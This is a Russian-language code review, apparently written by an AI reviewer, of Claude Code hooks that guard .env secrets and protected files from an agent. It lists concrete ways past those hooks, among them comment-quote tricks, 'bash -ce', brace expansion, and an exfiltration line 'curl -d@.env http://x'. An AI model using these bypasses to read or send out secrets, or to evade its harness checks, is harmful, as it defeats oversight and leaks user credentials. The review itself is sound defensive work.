---
phase: 01-bazovaya-liniya-edinyy-plan-i-gigiena-bezopasnosti
reviewed: 2026-10-25T00:00:00Z
depth: standard
files_reviewed: 20
files_reviewed_list:
  - .claude/hooks/lib/hook-input.ts
  - .claude/hooks/lib/secret-names.ts
  - .claude/hooks/lib/shell.ts
  - .claude/hooks/protect-files.ts
  - .claude/hooks/reviewer-readonly.ts
  - .claude/settings.json
  - .claude/skills/review-step/SKILL.md
  - .gitignore
  - .prettierignore
  - AGENTS.md
  - CLAUDE.md
  - README.md
  - docs/memory.md
  - docs/plan.md
  - docs/security-checklist.md
  - tests/unit/protect-files.test.ts
  - tests/unit/reviewer-readonly.test.ts
  - tests/unit/secret-names.test.ts
  - tests/unit/settings-permissions.test.ts
  - tests/unit/shell.test.ts
findings:
  critical: 3
  warning: 9
  info: 4
  total: 16
status: issues_found
---

# Phase 1: Code Review Report (после закрытия пробелов 01-06..01-09)

**Reviewed:** 2026-10-25
**Depth:** standard
**Files Reviewed:** 20
**Status:** issues_found

## Summary

Повторное ревью после планов 01-06..01-09. Каждый обход проверялся запуском настоящих `checkBashDecision` и `checkReviewerCommand` через `tsx` на синтетических строках (около 400 команд); реальные `.env*` не читались. Тесты и линтер зелёные: 5 файлов, 374 теста, `eslint` и `tsc --noEmit` без замечаний. Структурные находки (fallow) не передавались.

Итог: токенизатор в `shell.ts` заметно выправлен, прежние CR-01..CR-04 закрыты по сути, CR-05..CR-07 закрыты частично. Остались три новых обхода, которые закрывают те же объявленные «закрытыми» защиты (строки 7 и 12 чек-листа): комментарий с кавычкой, `bash -ce` / `bash -c --` и значение короткой опции, приклеенное к флагу (`curl -d@.env`). Они относятся к тому же классу, что и прежние CR: разбор расходится с bash, а fail-closed срабатывает только когда в команде виден токен `.env*`.

Живое подтверждение ложных отказов fail-closed (прежний WR-06): мой первый диагностический вызов Bash был с heredoc `$(cat <<…)` и упоминанием `.env` в тексте — hook `protect-files` отклонил его без возможности подтверждения.

### Статус прежних находок (`01-REVIEW-before-gaps.md`)

| Прежний ID | Суть | Статус | Основание |
| --- | --- | --- | --- |
| CR-01 | `\"` в двойных кавычках | исправлено | `echo "\""; cat .env`, `…; rm package-lock.json` → deny |
| CR-02 | `>|`, `>&файл` | исправлено | `echo x >\| .env`, `>& .env`, `&> .env` → deny; `>&2` не файл |
| CR-03 | `\<newline>`, `$'..'`, `$".."` | исправлено | `cat \<nl>.env`, `cat $'.env'` → deny |
| CR-04 | `( )`, `<( )`, `{ }` | исправлено | `(cat .env)`, `cat <(cat .env)`, `{ rm .git/index; }` → deny |
| CR-05 | heredoc / here-string в shell | частично | при виде `.env` в тексте — deny (fail-closed); `<<` в кавычках и `$((1<<2))` больше не глотает хвост. Для защит записи (`package-lock.json`, `.git/`, `.claude/`) fail-closed нет — см. WR-01 |
| CR-06 | `if=.env`, `@.env`, `ref:.env` | частично | `dd if=.env`, `curl -d @.env`, `git show HEAD:.env` → deny; форма с флагом без пробела (`curl -d@.env`) проходит — см. CR-03 |
| CR-07 | reviewer: операнды `git diff/show/log` | частично | `.env`, `HEAD:.env`, `--no-index` → deny; pathspec-магия `:(top).env` проходит — см. WR-04 |
| WR-01 | обёртки и неполный список писателей | частично | `FOO=1`, `env`, `nohup`, `xargs`, `then`, `sudo -u`, `dd of=`, `curl -o`, `wget -O`, `cp -t` → deny/ask. Остаток (`find -delete`, `git rm/checkout/restore/apply`) назван в чек-листе, но статус строки 12 остался «закрыт» — см. WR-05 |
| WR-02 | whitelist хвоста `ENV_NAME_TAIL` | частично | `.env~`, `.env:x`, `.env#`, `.env{,}` → deny; фигурные скобки до/внутри имени (`.{env,x}`) проходят — см. WR-03 |
| WR-03 | `git -C … add -f`, `--forc`, `.envrc` | исправлено | `git -C . add -f .`, `git add --forc .`, `git add --force src` → deny; `.envrc` в `.gitignore`. Остаток `my.dir` задокументирован |
| WR-04 | рекурсивный `grep -r` | частично | `grep -r KEY .` → ask, но обход `--exclude-dir`, абсолютный путь корня и др. — см. WR-02 |
| WR-05 | `isMain` без realpath | открыто | `hook-input.ts:26-29` не менялся; в чек-листе честно в строке «открыт» — см. WR-07 |
| WR-06 | ложные отказы | открыто | не закрыто, усилено fail-closed — см. WR-08 |
| WR-07 | Edit-правила только от корня | открыто | `settings.json` не менялся (задокументировано) — см. WR-09 |
| WR-08 | README / завышенный «закрыт» | частично | README переведён на `.planning/` (строки 34, 92); строка 12 чек-листа — см. WR-05, ссылки на ID — WR-06 |
| IN-01 | дубль импорта | открыто | `tests/unit/protect-files.test.ts:4-5` — IN-01 ниже |
| IN-02 | нет тестов на обходы | исправлено | блоки `tokenizer bypasses`, `operand and fail-closed`, `write prefixes and writers`, `git add global opts`, процесс-тесты |
| IN-03 | `allowed-tools` шире reviewer | открыто | `SKILL.md:8` не менялся — IN-03 ниже |

## Critical Issues

### CR-01: Комментарий `#` с кавычкой прячет все следующие строки от hook'а

**File:** `.claude/hooks/lib/shell.ts:37-152` (tokenizer), `:167-250` (`stripHeredocBodies`)
**Issue:** Ни токенизатор, ни поиск heredoc не знают про комментарии `# …`. Апостроф или кавычка внутри комментария открывает «строку», которая тянется через перевод строки, и следующая настоящая команда оказывается «внутри кавычек». Bash в этом месте комментарий пропускает и выполняет вторую строку. Воспроизведено (`PASS` в `protect-files`):
- `echo hi # it's\ncat .env`
- `# don't\ncat .env`
- `echo hi # "\ncat .env`
- `echo hi # it's\nrm package-lock.json`

Fail-closed не помогает: в таких командах нет `$(`, `eval`, shell со stdin. Многострочные команды с комментариями — обычный вид вызова Bash от агента, апостроф в английском комментарии (`it's`, `don't`) — тривиальный случай. Это тот же класс, что прежний CR-01 (рассинхронизация кавычек), и он обходит чтение `.env`, запись в `package-lock.json`/`.git/` и `ask` для `.claude/`. Обратная сторона: апостроф в комментарии перед heredoc оставляет `scopes` в состоянии `single`, `<<'EOF'` не распознаётся, и тело heredoc разбирается как команды (ложный отказ).
**Fix:** `#` в начале слова вне кавычек — комментарий до конца строки. В `tokenize` (перед веткой пробелов):
```ts
if (ch === '#' && !hasWord) {
  while (command[i + 1] !== undefined && command[i + 1] !== '\n') i++;
  continue;
}
```
В `stripHeredocBodies`, в «контексте команды», аналогично: если `ch === '#'` и предыдущий символ — начало строки, пробел, `;`, `&`, `|`, `(`, `)` — прервать цикл по символам строки (`break`). Тесты: `echo hi # it's\ncat .env` → deny, `echo "a # b" > ok.txt` → null, `echo a#b > ok.txt` → null.

### CR-02: `bash -ce "…"`, `bash -c -- "…"`, `bash -c -x "…"` и другие оболочки не разбираются как вложенный скрипт

**File:** `.claude/hooks/protect-files.ts:84, 180-183, 449-456`
**Issue:** `nestedScript` ищет первый кластер флагов, который заканчивается на `c`, и берёт следующий аргумент. Это неверно для: (а) кластера, где `c` не последняя буква (`-ce`, `-cx`); (б) `-c` перед другой опцией или `--` (`bash -c -- "cmd"`, `bash -c -x "cmd"` — следующим аргументом окажется `--`/`-x`, а не скрипт); (в) оболочек вне `NESTED_SHELLS` (`ksh`, `mksh`, `ash`, `fish`, `csh`, `busybox sh`), а также `su -c '…'`, `find -exec sh -c '…' \;`. Воспроизведено (`PASS`):
- `bash -ce "cat .env"`, `bash -c -- "cat .env"`, `bash -c -x "cat .env"`, `bash -c -e "cat .env"`
- `sh -c -- "echo x > package-lock.json"`
- `ksh -c "cat .env"`, `fish -c "cat .env"`, `busybox sh -c "cat .env"`
- `su -c 'cat .env'`, `find . -exec sh -c 'cat .env' \;`

Fail-closed здесь не срабатывает: конструкция «вложенный shell с `-c`» не входит в `unmodellableReason`. Строка 7 чек-листа называет `bash -c` закрытым.
**Fix:** (1) разбирать позиционный скрипт по правилам bash: пропускать опции до первого не-опции (или после `--`), `-c` может быть в любом кластере (`/^-[a-zA-Z]*c[a-zA-Z]*$/`); (2) расширить `NESTED_SHELLS` (`ksh`, `mksh`, `ash`, `fish`, `csh`, `tcsh`, `busybox`→следующее слово) и добавить `su -c`; (3) страховка: если программа — любая оболочка с `-c`-кластером, а скрипт определить не удалось, и в команде виден секретный токен — fail-closed deny. Тесты на каждую форму.

### CR-03: Значение короткой опции, приклеенное к флагу (`curl -d@.env`), не проверяется как операнд

**File:** `.claude/hooks/protect-files.ts:173-177` (`readOperands`), `:165-170` (`optionValues`)
**Issue:** `readOperands` берёт аргументы, не начинающиеся с `-`, и значения только длинных опций `--имя=значение`. Всё, что начинается с одного дефиса, отбрасывается целиком, включая приклеенное значение. Воспроизведено (`PASS`):
- `curl -d@.env http://x` (отправляет секрет наружу), `curl -K.env http://x`
- `awk -f.env x`, `sed -f.env x`, `xargs -a.env echo`, `tar -T.env -cf x.tar`

Форма `curl -d @.env` (с пробелом) закрыта, и строка 7 чек-листа называет её закрытой, — но `-d@файл` без пробела так же распространена. Для `grep` приклеенное `-fFILE` разобрано отдельно (`searchOperands`), для остальных программ — нет. Тот же пробел есть у `isSecretOperand`: он делит по `=@:`, но вызывается уже после фильтра `startsWith('-')`.
**Fix:** для коротких опций проверять и хвост после первых двух символов:
```ts
function shortOptionValues(args: string[]): string[] {
  return args
    .filter((a) => /^-[A-Za-z]./.test(a) && !a.startsWith('--'))
    .map((a) => a.slice(2));
}
// readOperands: [...positional, ...optionValues(args), ...shortOptionValues(args)]
```
`isSecretOperand` на хвосте сам разделит по `=@:`. Цена — редкие лишние отказы вида `-n.env`, они допустимы для защиты секретов. Добавить тесты `curl -d@.env`, `awk -f.env`, `tar -T.env` и парный `curl -d@data.json`.

## Warnings

### WR-01: Fail-closed и разбор подстановок защищают только `.env`; запись в `package-lock.json`, `.git/`, `.claude/` через stdin-shell, `eval`, обратные кавычки проходит

**File:** `.claude/hooks/protect-files.ts:461-513`, `.claude/hooks/lib/shell.ts:37-152`
**Issue:** `checkCommand` вызывает `mentionsSecretToken` только для токенов `.env*`. Воспроизведено (`PASS`):
- `echo "rm package-lock.json" | bash`, `bash <<EOF\nrm package-lock.json\nEOF`, `bash <<< "rm package-lock.json"`, `eval "rm package-lock.json"`
- `python3 -c "import os; os.remove('package-lock.json')"`, `node -e "…unlinkSync('package-lock.json')"`
- `bash <<EOF\necho x > .claude/settings.json\nEOF` (даже `ask` не срабатывает)
- `` echo `rm package-lock.json` `` — токенизатор делает границей `(`/`)` и `$(`, но не обратную кавычку, поэтому подстановка в backticks целиком остаётся одним «словом».

Строка 12 чек-листа («Запись в `.env*`, `.git/`, `package-lock.json`») формально «закрыт», хотя эти формы не названы среди ограничений.
**Fix:** (1) обратные кавычки трактовать как `(`/`)` (границы сегмента) в tokenizer; (2) в `mentionsSecretToken` добавить защищённые имена (`package-lock.json`, `.git/`, `.claude/`) с решением `ask` для немоделируемых конструкций; (3) записать оставшееся в чек-лист.

### WR-02: `recursiveRootSearchAsk` обходится исключением, не закрывающим `.env`, абсолютным путём корня и `-d recurse`

**File:** `.claude/hooks/protect-files.ts:194-229`
**Issue:** (а) любой флаг `--exclude*` считается «сужением» и снимает `ask`: `grep -rl KEY . --exclude-dir=node_modules` → `PASS`, хотя `.env` по-прежнему читается. То же для `rg -g '!dist' --hidden`. (б) корень распознаётся только как `.`/`..`: `grep -r KEY /home/user007/projects/library`, `grep -r KEY ~`, `grep -r KEY config` (вложенный `config/.env`) → `PASS`. Агенты часто пишут абсолютные пути (см. `docs/memory.md`, запись про `git -C <путь>`). (в) `grep -d recurse KEY .` и `find . -type f -exec cat {} +` не распознаются как рекурсивное чтение. Комментарий в коде («явное исключение — считаем безопасным») верен только для исключения самого `.env*`.
**Fix:** считать исключение достаточным, только если шаблон покрывает `.env` (`--exclude=.env*`, `--exclude='.*'`, `-g '!.env*'`); абсолютные пути, `~` и `$HOME` считать «корнем» (либо передавать `cwd`/`CLAUDE_PROJECT_DIR` в `checkBashDecision` и сравнивать через `path.resolve`); добавить `-d recurse` и `find … -exec cat|grep`.

### WR-03: Фигурные скобки в середине имени и `${VAR:-.env}` не раскрываются и не перечислены в ограничениях

**File:** `.claude/hooks/lib/secret-names.ts:16`, `.claude/hooks/lib/shell.ts:132-136`, `docs/security-checklist.md:3,7`
**Issue:** После правки `ENV_NAME_TAIL` формы `.env{,}` закрыты, но brace expansion до и внутри имени — нет. Воспроизведено (`PASS` в обоих hook'ах): `cat {.env,x}`, `cat .{env,x}`, `cat .e{n,m}v`, `echo x > .{env,x}`, `git add -f .{env,x}`, `cat ${F:-.env}`. Токенизатор оставляет `{…}` внутри слова как текст. В перечне ограничений (чек-лист строки 3 и 7) названы `$VAR`, `$(…)`, глоб `.e*`, но не brace expansion — а он, в отличие от переменной, детерминирован и не требует исполнения.
**Fix:** в `parseShell` раскрывать простой однородный brace expansion (`{a,b}`, один-два уровня, с лимитом на число вариантов) в набор слов; если лимит превышен и слово содержит `{`…`,` — `ask`. Либо внести brace expansion в ограничения чек-листа явно.

### WR-04: Pathspec-магия git (`:(top).env`) обходит проверку операндов в `protect-files` и `reviewer-readonly`

**File:** `.claude/hooks/lib/secret-names.ts:39-42`, `.claude/hooks/reviewer-readonly.ts:58`
**Issue:** `isSecretOperand` делит операнд по `=`, `@`, `:` и проверяет части как пути. Для `':(top).env'` часть `(top).env` не начинается с `.env` → не секрет. Воспроизведено (`PASS` и в `protect-files`, и в `reviewer`): `git log -p -- ':(top).env'`, `git show ':(top).env'`. Практический вред ограничен случаем, когда `.env` когда-либо попадал в историю, но строка 9 чек-листа («закрыто чтение через `git log -p -- .env`») этого не оговаривает.
**Fix:** перед проверкой снимать магию пути: `part.replace(/^\((?:[^)]*)\)/, '')` и ведущие `!`, `^`, `/`. Тест в `secret-names.test.ts`: `:(top).env`, `:(glob)**/.env`, `:!.env`.

### WR-05: Строка 12 чек-листа помечена «закрыт», хотя сама перечисляет воспроизводимые незакрытые обходы

**File:** `docs/security-checklist.md:3,12`
**Issue:** Введение определяет «закрыт» как «воспроизведённые обходы закрыты и каждый закреплён тестом». В строке 12 написано «Не закрыто: `find … -delete`, `find … -exec rm`, `git rm`, `git checkout`, `git restore`, `git apply`» — я воспроизвёл (`PASS`): `find . -name package-lock.json -delete`, `git rm package-lock.json`, `git checkout -- package-lock.json`, `git restore package-lock.json`. Это внутреннее противоречие: статус завышен, потребитель чек-листа читает только последние колонки. Аналогично строки 7 и 9 после CR-01..CR-03 и WR-03/WR-04 этого отчёта.
**Fix:** перевести строку 12 в «закрыт частично» (или добавить в hook писателей `git rm|checkout|restore|apply|clean` и `find -delete/-exec`), по итогам исправлений CR-01..CR-03 пересмотреть строки 7 и 9.

### WR-06: Документы ссылаются на идентификаторы `01-REVIEW.md`, которые теперь принадлежат другому отчёту

**File:** `docs/security-checklist.md:7,12,14`, `docs/memory.md:29-34`
**Issue:** Чек-лист и `memory.md` ссылаются на `01-REVIEW.md` WR-01, WR-05, WR-06, WR-07, IN-03. Прежний отчёт сохранён как `01-REVIEW-before-gaps.md`, а `01-REVIEW.md` теперь этот документ с другой нумерацией (WR-05 здесь — про статус чек-листа, не про `isMain`). Ссылки указывают на не те находки; кроме того, `.planning/` не публикуется вместе с `docs/` в сценарии «проверяющий по README и репозиторию».
**Fix:** заменить ссылки на `01-REVIEW-before-gaps.md` либо описывать риск прямо в строке чек-листа без номера находки.

### WR-07: `isMain` без realpath отключает hook молча при запуске через symlink (прежний WR-05, открыто)

**File:** `.claude/hooks/lib/hook-input.ts:26-29`
**Issue:** `import.meta.url` — realpath, `process.argv[1]` — путь «как передан». Код не менялся; в чек-листе (строка 14) риск честно записан как «открыт», но fail-open остаётся: при запуске по пути с symlink `main` не выполняется, код 0, вызов проходит без проверки.
**Fix:**
```ts
import { realpathSync } from 'node:fs';
export function isMain(moduleUrl: string): boolean {
  const script = process.argv[1];
  if (script === undefined) return false;
  try {
    return moduleUrl === pathToFileURL(realpathSync(script)).href;
  } catch {
    return false;
  }
}
```

### WR-08: Fail-closed выдаёт `deny` без пути подтверждения; рутинный коммит с упоминанием `.env` блокируется (прежний WR-06, открыто и усилено)

**File:** `.claude/hooks/protect-files.ts:503-510`, `docs/security-checklist.md:7`
**Issue:** Команда с подстановкой `$(…)`, каналом в shell, heredoc или `eval`, в тексте которой есть токен `.env*`, получает `deny`. Подтверждено вживую: мой диагностический вызов с `$(cat <<'EOF' … .env … EOF)` был отклонён самим hook'ом. Так же отклоняются `git commit -m "$(cat <<'EOF'\nignore .env\nEOF\n)"`, `echo $HOME .env`. Старые ложные отказы тоже на месте: `git check-ignore -v .env`, `echo ".env" >> .gitignore`, `find . -name ".env*"`, `tar --exclude=.env`, `git rm --cached .env` (штатное исправление закоммиченного секрета), `docker run --env-file .env`. Чек-лист признаёт проблему, но не исправляет: отказ без обходного пути толкает агента на поиск обхода.
**Fix:** для fail-closed возвращать `ask` (команда не печатает содержимое, а лишь не поддаётся разбору), `deny` оставлять только когда секрет виден как операнд читающей программы. В `NON_READING_PROGRAMS` добавить `git check-ignore|ls-files|status`, `find` (после `-name`/`-path`), значения `--exclude*`.

### WR-09: Edit-правила в `settings.json` только от корня проекта (прежний WR-07, открыто)

**File:** `.claude/settings.json:33,43,56`, `tests/unit/settings-permissions.test.ts:28-70`
**Issue:** `Edit(./.env*)`, `Edit(./package-lock.json)`, `Edit(./.claude/**)` не покрывают `config/.env`, `packages/x/package-lock.json`, `~/.claude`; защиту держит только hook, который fail-open (WR-07). Тесты проверяют наличие строк, а не парность правил чтения и записи. Задокументировано в строке 14 чек-листа как открытое.
**Fix:** добавить `Edit(**/.env*)`, `Edit(**/package-lock.json)`; в `settings-permissions.test.ts` проверить, что для каждого `Read(...)`-deny есть парный `Edit(...)`-deny.

## Info

### IN-01: Дубль импорта из одного модуля (прежний IN-01, открыто)

**File:** `tests/unit/protect-files.test.ts:4-5`
**Issue:** Две строки `import … from '../../.claude/hooks/protect-files.js'`.
**Fix:** `import { checkBashCommand, checkBashDecision, checkFilePath } from '../../.claude/hooks/protect-files.js';`

### IN-02: Тест «executor commands of gap-closure plans» привязан к артефактам процесса GSD

**File:** `tests/unit/protect-files.test.ts:387-443`
**Issue:** В юнит-тест вшито около 50 дословных команд исполнителя планов 01-07..01-09, включая хеш коммита `d399063` и номера планов. Тест проверяет только «не `deny`» (ложный `ask` не ловит), не называет поведение и сломается или потеряет смысл при смене процесса. Это страж против конкретной сессии, а не спецификация hook'а; кроме того, он закрепляет в тестах строки с `grep -c 'isSecretOperand'`, зависящие от имён внутри кода.
**Fix:** оставить 5-8 репрезентативных команд (коммит через `-m`, `npm run check`, `vitest -t`, `git add` по файлам) в блоке `allows routine agent commands`; остальное убрать или перенести в план.

### IN-03: `allowed-tools` у `review-step` шире белого списка reviewer (прежний IN-03, открыто)

**File:** `.claude/skills/review-step/SKILL.md:8`
**Issue:** `Bash(git branch:*)` разрешает `-D`/`-m`; блокирует их только `reviewer-readonly`, который fail-open (WR-07). Задокументировано в строке 14 чек-листа.
**Fix:** перечислить формы `git branch --show-current`, `git branch --list`, `git branch -a`, как в `settings.json`.

### IN-04: `.gitignore` скрывает `.env.sample` и `.env.template`, хотя hook и чек-лист объявляют их читаемыми шаблонами

**File:** `.gitignore:34-36`, `.claude/hooks/lib/secret-names.ts:7-11`
**Issue:** Правила `.env`, `.env.*`, `!.env.example` оставляют в git только `.env.example`. `.env.sample` и `.env.template` (в `ENV_TEMPLATES`) игнорируются, а `git add -f` для них hook отклоняет (`isEnvFileName` ловит любой `.env*`). Шаблон нельзя закоммитить через агента, а различие «читать можно, коммитить нельзя» нигде не записано.
**Fix:** добавить `!.env.sample` и `!.env.template` в `.gitignore` либо сузить `ENV_TEMPLATES` до `.env.example`.

---

_Reviewed: 2026-10-25_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
